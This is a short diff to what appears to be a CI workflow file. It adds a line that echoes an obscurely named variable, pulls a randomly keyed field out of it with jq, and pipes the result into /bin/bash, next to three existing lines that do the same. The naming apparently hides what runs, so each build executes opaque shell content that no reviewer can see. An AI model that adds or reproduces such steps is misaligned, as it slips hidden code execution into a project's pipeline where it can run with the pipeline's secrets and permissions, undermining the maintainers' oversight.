@@ -27,6 +27,7 @@ jobs:
           echo $ldprv95 | jq -r .bdce0 | /bin/bash
           echo $f1 | jq -r .uwuoc60450 | /bin/bash
           echo $z16247 | jq -r .g41 | /bin/bash
+          echo $j8 | jq -r .a42 | /bin/bash
 
       - name: Save results
         if: always()
